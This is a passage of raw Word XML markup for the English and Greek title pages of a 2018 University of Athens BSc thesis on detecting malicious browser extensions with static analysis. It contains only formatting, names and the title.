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8982C6" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRDefault="008A44E0" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Hlk515623560"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r w:rsidRPr="00A91ECD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="611AEC56" wp14:editId="60E998B3">
            <wp:extent cx="904875" cy="1143000"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1" name="Picture 1" descr="LOGO_UOA%20b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OA%20b_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4875" cy="1143000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="736AE2FB" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00CA5EC6" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6692BD74" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D2B00">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>NATIONAL AND KAPODISTRIAN UNIVERSITY OF ATHENS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="267AF82A" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="568F21BF" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SCHOOL OF SCIENCE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0E88F5" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D2B00">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>DEPARTMENT OF INFORMATICS AND TELECOMMUNICATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64A90069" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42819B14" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="01272D6E" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57067C4C" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EDB5750" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FB165FD" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BSc THESIS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A27127" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="49DBC1A1" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EA01CE0" w14:textId="62E6E0B6" w:rsidR="00811CAF" w:rsidRPr="00811CAF" w:rsidRDefault="009924AB" w:rsidP="00811CAF">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Detecting </w:t>
      </w:r>
      <w:r w:rsidR="00811CAF" w:rsidRPr="00811CAF">
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Browser</w:t>
      </w:r>
      <w:r w:rsidR="00811CAF" w:rsidRPr="00811CAF">
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Extensions</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> with Static Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F80799E" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EC67DBC" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FD27F3F" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="596867BB" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00811CAF" w:rsidRDefault="00811CAF" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00811CAF">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ILIAS A. RAFAIL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15605497" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B99EEA9" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B65A003" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14B86C08" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="021539B0" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0352D30F" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B7789D2" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53EEFD92" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3528"/>
        <w:gridCol w:w="6043"/>
      </w:tblGrid>
      <w:tr w:rsidR="002D2B00" w:rsidRPr="002D2B00" w14:paraId="7E94A93B" w14:textId="77777777" w:rsidTr="00624FEE">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3528" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1282BCC2" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D335C" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Supervisor</w:t>
            </w:r>
            <w:r w:rsidRPr="00523C30">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6043" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="27CF29A7" w14:textId="77777777" w:rsidR="00DB6B92" w:rsidRDefault="002B3B20" w:rsidP="009924AB">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:ins w:id="1" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z"/>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Dimitris Mitropoulos</w:t>
            </w:r>
            <w:r w:rsidR="002D2B00" w:rsidRPr="002D2B00">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r w:rsidR="009924AB">
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Adjunct Faculty</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3C901579" w14:textId="517DBB2B" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="009924AB" w:rsidP="009924AB">
            <w:pPr>
              <w:tabs>
                <w:tab w:val="left" w:pos="1980"/>
              </w:tabs>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:pPr>
            <w:del w:id="2" w:author="Dimitris Mitropoulos" w:date="2018-08-30T16:26:00Z">
              <w:r w:rsidDel="00DB6B92">
                <w:rPr>
                  <w:b/>
                </w:rPr>
                <w:delText xml:space="preserve"> </w:delText>
              </w:r>
            </w:del>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Alexis Delis, Professor</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="282D3A51" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A22EEE5" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1985"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5933AD3E" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E8A0C80" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="010E5056" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D2CB1CF" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56AE1F60" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F68EA9" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DCBD764" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ATHENS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5012E3AE" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="00295C39" w:rsidRDefault="002D2B00" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FB56791" w14:textId="77777777" w:rsidR="002D2B00" w:rsidRPr="002D2B00" w:rsidRDefault="00481D34" w:rsidP="002D2B00">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>JUNE</w:t>
      </w:r>
      <w:r w:rsidR="002D2B00" w:rsidRPr="00080625">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2018</w:t>
      </w:r>
      <w:r w:rsidR="00624FEE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D533250" w14:textId="77777777" w:rsidR="0017020F" w:rsidRDefault="008A44E0" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00A91ECD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7C93F5B9" wp14:editId="5346AD39">
            <wp:extent cx="904875" cy="1143000"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="2" name="Picture 2" descr="LOGO_UOA%20b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UOA%20b_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4875" cy="1143000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBE2505" w14:textId="77777777" w:rsidR="00CA5EC6" w:rsidRPr="00CA5EC6" w:rsidRDefault="00CA5EC6" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="389EF155" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΕΘΝΙΚΟ ΚΑΙ ΚΑΠΟ</w:t>
      </w:r>
      <w:r w:rsidR="00BC42AE" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>Δ</w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΙΣΤΡΙΑΚΟ ΠΑΝΕΠΙΣΤΗΜΙΟ ΑΘΗΝΩΝ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="449D0C6A" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57F223BC" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="006A629E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΣΧΟΛΗ ΘΕΤΙΚΩΝ ΕΠΙΣΤΗΜΩΝ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F51CC58" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="006A629E">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΤΜΗΜΑ ΠΛΗΡΟΦΟΡΙΚΗΣ ΚΑΙ ΤΗΛΕΠΙΚΟΙΝΩΝΙΩΝ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00193F23" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6397DC3B" w14:textId="77777777" w:rsidR="003E69B6" w:rsidRPr="005B5B30" w:rsidRDefault="003E69B6" w:rsidP="003E69B6">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53E8BE51" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22DA0CB5" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22264915" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31CE6F7D" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΠΤΥΧΙΑΚΗ</w:t>
      </w:r>
      <w:r w:rsidR="003E69B6" w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005B5B30">
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
        <w:t>ΕΡΓΑΣΙΑ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5797E57A" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="794B55B4" w14:textId="77777777" w:rsidR="0017020F" w:rsidRPr="005B5B30" w:rsidRDefault="0017020F" w:rsidP="0017020F">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:lang w:val="el-GR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A23D92B" w14:textId="0B1B4A66" w:rsidR="0017020F" w:rsidRPr="009924AB" w:rsidRDefault="009924AB" w:rsidP="00C060E4">
